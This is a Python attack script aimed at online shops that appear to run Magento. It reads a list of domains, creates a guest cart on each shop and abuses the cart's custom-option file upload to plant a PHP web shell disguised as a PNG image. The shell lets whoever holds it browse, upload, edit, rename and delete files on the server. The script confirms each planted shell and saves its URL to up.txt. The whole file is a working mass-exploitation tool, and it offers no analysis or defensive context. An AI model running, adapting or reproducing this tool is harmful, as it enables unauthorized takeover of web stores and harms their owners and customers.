# -*- coding: utf-8 -*-
import requests
import json
import urllib3
import re
import sys
import threading
import Queue
import random
import string 
from datetime import datetime

urllib3.disable_warnings()

HEADERS = {
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}

php_B64 = (
    "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QVJBVE9SIC4gJHBhcnQ7DQogICAgICAgICRicmVhZGNydW1iW10gPSAiPGEgaHJlZj0nP2Rpcj0iIC4gdXJsZW5jb2RlKCRwYXRoKSAuICInPiIgLiBodG1sc3BlY2lhbGNoYXJzKCRwYXJ0KSAuICI8L2E+IjsNCiAgICB9DQoNCiAgICByZXR1cm4gaW1wbG9kZShESVJFQ1RPUllfU0VQQVJBVE9SLCAkYnJlYWRjcnVtYik7DQp9DQoNCiRkaXJlY3RvcnkgPSBpc3NldCgkX0dFVFsnZGlyJ10pID8gJF9HRVRbJ2RpciddIDogIi4iOw0KJGRpcmVjdG9yeSA9IEByZWFscGF0aCgkZGlyZWN0b3J5KTsNCg0KaWYgKCEkZGlyZWN0b3J5IHx8ICFpc19kaXIoJGRpcmVjdG9yeSkpIHsNCiAgICBkaWUoIkRpcmVrdG9yaSB0aWRhayB2YWxpZC4iKTsNCn0NCg0KJG1lc3NhZ2UgPSAiIjsgDQoNCmlmIChpc3NldCgkX1BPU1RbJ3VwbG9hZCddKSkgew0KICAgIGlmICgkX0ZJTEVTWydmaWxlJ11bJ2Vycm9yJ10gPT09IFVQTE9BRF9FUlJfTk9fRklMRSkgew0KICAgICAgICAkbWVzc2FnZSA9ICJUaWRhayBhZGEgZmlsZSB5YW5nIGRpcGlsaWguIjsNCiAgICB9IGVsc2Ugew0KICAgICAgICAkdGFyZ2V0RmlsZSA9ICRkaXJlY3RvcnkgLiAiLyIgLiBiYXNlbmFtZSgkX0ZJTEVTWydmaWxlJ11bJ25hbWUnXSk7DQogICAgICAgIGlmIChtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1snZmlsZSddWyd0bXBfbmFtZSddLCAkdGFyZ2V0RmlsZSkpIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkZpbGUgYmVyaGFzaWwgZGl1cGxvYWQuIjsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkdhZ2FsIG1lbmd1cGxvYWQgZmlsZS4iOw0KICAgICAgICB9DQogICAgfQ0KfQ0KDQppZiAoaXNzZXQoJF9HRVRbJ2RlbGV0ZSddKSkgew0KICAgICR0YXJnZXQgPSAkZGlyZWN0b3J5IC4gIi8iIC4gYmFzZW5hbWUoJF9HRVRbJ2RlbGV0ZSddKTsNCiAgICBpZiAoaXNfZmlsZSgkdGFyZ2V0KSkgew0KICAgICAgICBpZiAodW5saW5rKCR0YXJnZXQpKSB7DQogICAgICAgICAgICAkbWVzc2FnZSA9ICJGaWxlIGJlcmhhc2lsIGRpaGFwdXMuIjsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRtZXNzYWdlID0gIkdhZ2FsIG1lbmdoYXB1cyBmaWxlLiI7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkbWVzc2FnZSA9ICJPYmplayB0aWRhayB2YWxpZCB1bnR1ayBkaWhhcHVzLiI7DQogICAgfQ0KfQ0KDQppZiAoaXNzZXQoJF9QT1NUWydlZGl0J10pKSB7DQogICAgJGZpbGVUb0VkaXQgPSAkZGlyZWN0b3J5IC4gIi8iIC4gYmFzZW5hbWUoJF9QT1NUWydmaWxlX25hbWUnXSk7DQogICAgaWYgKGlzX2ZpbGUoJGZpbGVUb0VkaXQpKSB7DQogICAgICAgIGlmIChmaWxlX3B1dF9jb250ZW50cygkZmlsZVRvRWRpdCwgJF9QT1NUWydmaWxlX2NvbnRlbnQnXSkgIT09IGZhbHNlKSB7DQogICAgICAgICAgICAkbWVzc2FnZSA9ICJGaWxlIGJlcmhhc2lsIGRpZWRpdC4iOw0KICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgJG1lc3NhZ2UgPSAiR2FnYWwgbWVueWltcGFuIHBlcnViYWhhbiBmaWxlLiI7DQogICAgICAgIH0NCiAgICB9IGVsc2Ugew0KICAgICAgICAkbWVzc2FnZSA9ICJGaWxlIHRpZGFrIGRpdGVtdWthbi4iOw0KICAgIH0NCn0NCg0KaWYgKGlzc2V0KCRfUE9TVFsncmVuYW1lJ10pKSB7DQogICAgJG9sZE5hbWUgPSAkZGlyZWN0b3J5IC4gIi8iIC4gYmFzZW5hbWUoJF9QT1NUWydvbGRfbmFtZSddKTsNCiAgICAkbmV3TmFtZSA9ICRkaXJlY3RvcnkgLiAiLyIgLiBiYXNlbmFtZSgkX1BPU1RbJ25ld19uYW1lJ10pOw0KICAgIGlmIChyZW5hbWUoJG9sZE5hbWUsICRuZXdOYW1lKSkgew0KICAgICAgICAkbWVzc2FnZSA9ICJOYW1hIGJlcmhhc2lsIGRpdWJhaC4iOw0KICAgIH0gZWxzZSB7DQogICAgICAgICRtZXNzYWdlID0gIkdhZ2FsIG1lbmdnYW50aSBuYW1hLiI7DQogICAgfQ0KfQ0KDQplY2hvICI8aDM+U2hpbmRheTwvaDM+IjsNCmVjaG8gIjx1bD4iOw0KZWNobyAiPGxpPjxiPlNlcnZlcjo8L2I+ICIgLiAkX1NFUlZFUlsnU0VSVkVSX1NPRlRXQVJFJ10gLiAiPC9saT4iOw0KZWNobyAiPGxpPjxiPlNpc3RlbSBPcGVyYXNpOjwvYj4gIiAuIHBocF91bmFtZSgpIC4gIjwvbGk+IjsNCmVjaG8gIjxsaT48Yj5QSFAgVmVyc2lvbjo8L2I+ICIgLiBwaHB2ZXJzaW9uKCkgLiAiPC9saT4iOw0KZWNobyAiPC91bD4iOw0KDQplY2hvICI8aDI+RElSfjogIiAuIGNyZWF0ZUJyZWFkY3J1bWIoJGRpcmVjdG9yeSkgLiAiPC9oMj4iOw0KDQplY2hvICI8aDM+VXBsb2FkIEZpbGU8L2gzPiI7DQplY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnIGVuY3R5cGU9J211bHRpcGFydC9mb3JtLWRhdGEnPiI7DQplY2hvICI8aW5wdXQgdHlwZT0nZmlsZScgbmFtZT0nZmlsZSc+IjsNCmVjaG8gIjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J3VwbG9hZCcgdmFsdWU9J1VwbG9hZCc+IjsNCmVjaG8gIjwvZm9ybT4iOw0KDQppZiAoJG1lc3NhZ2UgIT09ICIiKSB7DQogICAgZWNobyAiPHAgc3R5bGU9J2NvbG9yOiBncmVlbjsnPiIgLiBodG1sc3BlY2lhbGNoYXJzKCRtZXNzYWdlKSAuICI8L3A+IjsNCn0NCg0KZWNobyAiPHVsIHN0eWxlPSdsaXN0LXN0eWxlOm5vbmU7IHBhZGRpbmc6MDsnPiI7DQoNCmlmIChpc3NldCgkX0dFVFsnZWRpdCddKSkgew0KICAgICRmaWxlVG9FZGl0ID0gJGRpcmVjdG9yeSAuICIvIiAuIGJhc2VuYW1lKCRfR0VUWydlZGl0J10pOw0KICAgIGlmIChpc19maWxlKCRmaWxlVG9FZGl0KSkgew0KICAgICAgICAkY29udGVudCA9IGh0bWxzcGVjaWFsY2hhcnMoZmlsZV9nZXRfY29udGVudHMoJGZpbGVUb0VkaXQpKTsNCiAgICAgICAgZWNobyAiPGgzPkVkaXQgRmlsZTogIiAuIGh0bWxzcGVjaWFsY2hhcnMoJF9HRVRbJ2VkaXQnXSkgLiAiPC9oMz4iOw0KICAgICAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnPiI7DQogICAgICAgIGVjaG8gIjx0ZXh0YXJlYSBuYW1lPSdmaWxlX2NvbnRlbnQnIHJvd3M9JzEwJyBjb2xzPSc1MCc+JGNvbnRlbnQ8L3RleHRhcmVhPjxicj4iOw0KICAgICAgICBlY2hvICI8aW5wdXQgdHlwZT0naGlkZGVuJyBuYW1lPSdmaWxlX25hbWUnIHZhbHVlPSciIC4gaHRtbHNwZWNpYWxjaGFycygkX0dFVFsnZWRpdCddKSAuICInPiI7DQogICAgICAgIGVjaG8gIjxpbnB1dCB0eXBlPSdzdWJtaXQnIG5hbWU9J2VkaXQnIHZhbHVlPSdTaW1wYW4nPiI7DQogICAgICAgIGVjaG8gIjwvZm9ybT4iOw0KICAgIH0gZWxzZSB7DQogICAgICAgIGVjaG8gIkZpbGUgdGlkYWsgZGl0ZW11a2FuLiI7DQogICAgfQ0KfQ0KDQppZiAoaXNzZXQoJF9HRVRbJ3JlbmFtZSddKSkgew0KICAgICRpdGVtVG9SZW5hbWUgPSAkZGlyZWN0b3J5IC4gIi8iIC4gYmFzZW5hbWUoJF9HRVRbJ3JlbmFtZSddKTsNCiAgICBpZiAoaXNfZmlsZSgkaXRlbVRvUmVuYW1lKSB8fCBpc19kaXIoJGl0ZW1Ub1JlbmFtZSkpIHsNCiAgICAgICAgZWNobyAiPGgzPlJlbmFtZSA6ICIgLiBodG1sc3BlY2lhbGNoYXJzKCRfR0VUWydyZW5hbWUnXSkgLiAiPC9oMz4iOw0KICAgICAgICBlY2hvICI8Zm9ybSBtZXRob2Q9J3Bvc3QnPiI7DQogICAgICAgIGVjaG8gIjxpbnB1dCB0eXBlPSd0ZXh0JyBuYW1lPSduZXdfbmFtZScgcGxhY2Vob2xkZXI9J05hbWEgYmFydSc+IjsNCiAgICAgICAgZWNobyAiPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nb2xkX25hbWUnIHZhbHVlPSciIC4gaHRtbHNwZWNpYWxjaGFycygkX0dFVFsncmVuYW1lJ10pIC4gIic+IjsNCiAgICAgICAgZWNobyAiPGlucHV0IHR5cGU9J3N1Ym1pdCcgbmFtZT0ncmVuYW1lJyB2YWx1ZT0nUmVuYW1lJz4iOw0KICAgICAgICBlY2hvICI8L2Zvcm0+IjsNCiAgICB9IGVsc2Ugew0KICAgICAgICBlY2hvICJGaWxlIGF0YXUgZm9sZGVyIHRpZGFrIGRpdGVtdWthbi4iOw0KICAgIH0NCn0NCg0KJGZvbGRlcnMgPSBhcnJheSgpOw0KJGZpbGVzID0gYXJyYXkoKTsNCg0KaWYgKCRkaCA9IEBvcGVuZGlyKCRkaXJlY3RvcnkpKSB7DQogICAgd2hpbGUgKCgkZmlsZSA9IHJlYWRkaXIoJGRoKSkgIT09IGZhbHNlKSB7DQogICAgICAgIGlmICgkZmlsZSA9PSAiLiIgfHwgJGZpbGUgPT0gIi4uIikgY29udGludWU7DQogICAgICAgICRwYXRoID0gJGRpcmVjdG9yeSAuIERJUkVDVE9SWV9TRVBBUkFUT1IgLiAkZmlsZTsNCiAgICAgICAgaWYgKGlzX2RpcigkcGF0aCkpIHsNCiAgICAgICAgICAgICRmb2xkZXJzW10gPSAkZmlsZTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICRmaWxlc1tdID0gJGZpbGU7DQogICAgICAgIH0NCiAgICB9DQogICAgY2xvc2VkaXIoJGRoKTsNCn0gZWxzZSB7DQogICAgZWNobyAiPGxpPm5vbmU8L2xpPiI7DQp9DQoNCnNvcnQoJGZvbGRlcnMpOw0Kc29ydCgkZmlsZXMpOw0KDQpmb3JlYWNoICgkZm9sZGVycyBhcyAkZm9sZGVyKSB7DQogICAgJHBhdGggPSAkZGlyZWN0b3J5IC4gIi8iIC4gJGZvbGRlcjsNCiAgICAkaXNFZGl0YWJsZSA9IGlzX3dyaXRhYmxlKCRwYXRoKTsNCiAgICAkY29sb3IgPSAkaXNFZGl0YWJsZSA/ICdncmVlbicgOiAncmVkJzsgDQogICAgZWNobyAiPGxpIHN0eWxlPSdjb2xvcjogJGNvbG9yOyc+PGI+W0RJUl08L2I+IDxhIGhyZWY9Jz9kaXI9IiAuIHVybGVuY29kZSgkcGF0aCkgLiAiJz4iIC4gaHRtbHNwZWNpYWxjaGFycygkZm9sZGVyKSAuICI8L2E+IjsNCn0NCg0KZm9yZWFjaCAoJGZpbGVzIGFzICRmaWxlKSB7DQogICAgJHBhdGggPSAkZGlyZWN0b3J5IC4gIi8iIC4gJGZpbGU7DQogICAgJGlzRWRpdGFibGUgPSBpc193cml0YWJsZSgkcGF0aCk7DQogICAgJGNvbG9yID0gJGlzRWRpdGFibGUgPyAnZ3JlZW4nIDogJ3JlZCc7DQogICAgZWNobyAiPGxpIHN0eWxlPSdjb2xvcjogJGNvbG9yOyc+PGI+W0ZJTEVdPC9iPiAiIC4gaHRtbHNwZWNpYWxjaGFycygkZmlsZSk7DQogICAgZWNobyAiIDxhIGhyZWY9Jz9lZGl0PSIgLiB1cmxlbmNvZGUoJGZpbGUpIC4gIiZkaXI9IiAuIHVybGVuY29kZSgkZGlyZWN0b3J5KSAuICInc3R5bGU9J2NvbG9yOnJlZDsnPltFZGl0XTwvYT4iOw0KICAgIGVjaG8gIiA8YSBocmVmPSc/ZGlyPSIgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAiJnJlbmFtZT0iIC4gdXJsZW5jb2RlKCRmaWxlKSAuICInIHN0eWxlPSdjb2xvcjpyZWQ7Jz5bUmVuYW1lXTwvYT4iOw0KICAgIGVjaG8gIiA8YSBocmVmPSc/ZGlyPSIgLiB1cmxlbmNvZGUoJGRpcmVjdG9yeSkgLiAiJmRlbGV0ZT0iIC4gdXJsZW5jb2RlKCRmaWxlKSAuICInIA0KICAgICAgICBzdHlsZT0nY29sb3I6cmVkOycgb25jbGljaz0ncmV0dXJuIGNvbmZpcm0oXCJZYWtpbiBpbmdpbiBtZW5naGFwdXMgZmlsZSBpbmk/XCIpJz5bRGVsZXRlXTwvYT4iOw0KfQ0KZWNobyAiPC91bD4iOw0KPz7zwKpcAAAAAElFTkSuQmCC"
)

queue = Queue.Queue()
lock = threading.Lock()
valid_results = []

def generate_random_filename():
    chars = string.ascii_lowercase + string.digits
    random_name = ''.join(random.choice(chars) for _ in range(5))
    return random_name + "_shin.php"
    


def clean_url(url):
    url = url.strip()
    
    url = url.rstrip('/')
    
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url
    
    return url

def get_product(base_url):
    try:
        url = base_url + "/graphql"
        
        payload = {
            "query": "{ products(search: \"\", pageSize: 1) { items { sku name } } }"
        }
        
        r = requests.post(
            url,
            headers=HEADERS,
            data=json.dumps(payload),
            verify=False,
            timeout=30
        )
        
        data = r.json()
        
        if not data.get("data"):
            print("[-] No 'data' field in response")
            return None
            
        if not data["data"].get("products"):
            print("[-] No 'products' field in response")
            return None
            
        if not data["data"]["products"].get("items"):
            print("[-] No 'items' array in products")
            return None
            
        if len(data["data"]["products"]["items"]) == 0:
            print("[-] Empty items array - no products found")
            return None
            
        item = data["data"]["products"]["items"][0]
        sku = item.get("sku")
        
        if not sku:
            print("[-] No SKU found in product item")
            return None
            
        print("[+] SKU  : %s" % sku)
        return sku
        
    except requests.exceptions.RequestException as e:
        print("[-] Network Error for %s: %s" % (base_url, str(e)))
        return None
    except ValueError as e:
        print("[-] JSON Parse Error for %s: %s" % (base_url, str(e)))
        return None
    except Exception as e:
        print("[-] Product Error for %s: %s" % (base_url, str(e)))
        return None

def create_cart(base_url):
    try:
        url = base_url + "/rest/default/V1/guest-carts"
        
        r = requests.post(
            url,
            headers=HEADERS,
            data="{}",
            verify=False,
            timeout=30
        )
        
        cart_id = r.text.replace('"', '').strip()
        print("[+] CART : %s" % cart_id)
        return cart_id
        
    except Exception as e:
        print("[-] Cart Error for %s: %s" % (base_url, str(e)))
        return None

def save_result(result):
    with lock:
        valid_results.append(result)
        with open("up.txt", "a") as f:

            if isinstance(result, unicode):
                f.write(result.encode('utf-8') + "\n")
            else:
                f.write(result + "\n")

        try:
            print("[✓] Saved to up.txt: %s" % result.encode('utf-8') if isinstance(result, unicode) else result)
        except:
            print("[✓] Saved to up.txt: %r" % result)

def upload_php(base_url, cart_id, sku):
    try:
        url = base_url + "/rest/default/V1/guest-carts/%s/items" % cart_id
        payload = {
            "quoteId": cart_id,
            "cartItem": {
                "sku": sku,
                "qty": 1,
                "product_option": {
                    "extension_attributes": {
                        "custom_options": [{
                            "extension_attributes": {
                                "file_info": {
                                    "base64_encoded_data": php_B64,
                                    "name": str(generate_random_filename()),
                                    "type": "image/png"
                                }
                            },
                            "option_id": "12345",
                            "option_value": "file"
                        }]
                    }
                }
            }
        }
        r = requests.post(url, headers=HEADERS, data=json.dumps(payload), verify=False, timeout=20)
        print("[+] Upload Status : %s" % r.status_code)
        if r.status_code != 200:
            return

        body = r.text
        path_match = re.search(r'custom_options[/\\\\]+quote[/\\\\]+([^/\\\\]+)[/\\\\]+([^/\\\\]+)[/\\\\]+([^/\s"\']+\.php)', body, re.IGNORECASE)
        if not path_match:
            return

        subdir1, subdir2, filename = path_match.group(1), path_match.group(2), path_match.group(3)
        paths = ("/pub/media/custom_options/quote/%s/%s/%s", "/media/custom_options/quote/%s/%s/%s")
        urls = [base_url + p % (subdir1, subdir2, filename) for p in paths]

        for file_url in urls:
            try:
                rr = requests.get(file_url, headers=HEADERS, verify=False, timeout=15)

                if rr.status_code == 200 and b'Shinday' in rr.content:

                    try:
                        print("[+] Webshell terpasang: %s" % file_url.encode('utf-8') if isinstance(file_url, unicode) else file_url)
                    except:
                        print("[+] Webshell terpasang: %r" % file_url)
                    save_result(file_url)
                    return
            except Exception as e:
                msg = str(e).split('\n')[0]
                if 'codec' in msg or 'decode' in msg:
                    continue  
                print("[-] Check Error: %s" % msg)
                continue
        print("[-] File not accessible")
    except Exception as e:
        msg = str(e).split('\n')[0]
        if 'codec' not in msg:
            print("[-] Upload Error: %s" % msg)

def worker(thread_id):
    while not queue.empty():
        try:
            base_url = queue.get_nowait()
        except Queue.Empty:
            break
        
        base_url = clean_url(base_url)
        
        print("\n[Thread %s] Processing: %s" % (thread_id, base_url))
        
        sku = get_product(base_url)
        if not sku:
            queue.task_done()
            continue
        
        cart_id = create_cart(base_url)
        if not cart_id:
            queue.task_done()
            continue
        
        upload_php(base_url, cart_id, sku)
        queue.task_done()

def main():
    if len(sys.argv) != 2:
        print("Usage: python %s <list.txt>" % sys.argv[0])
        print("Example: python %s domains.txt" % sys.argv[0])
        sys.exit(1)
    
    list_file = sys.argv[1]
    
    try:
        with open(list_file, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
    except IOError:
        print("[-] Error: Cannot read file %s" % list_file)
        sys.exit(1)
    
    if not targets:
        print("[-] No targets found in file")
        sys.exit(1)
    
    print("[*] Total targets: %s" % len(targets))
    print("[*] Start time: %s" % datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
    
    
    for target in targets:
        queue.put(target)
    
    num_threads = min(10, len(targets))
    threads = []
    
    print("[*] Starting %s threads..." % num_threads)
    
    for i in range(num_threads):
        t = threading.Thread(target=worker, args=(i+1,))
        t.daemon = True
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    print("\n[*] Completed!")
    print("[*] Total valid results in this session: %s" % len(valid_results))
    print("[*] Results appended to up.txt")

if __name__ == "__main__":
    main()
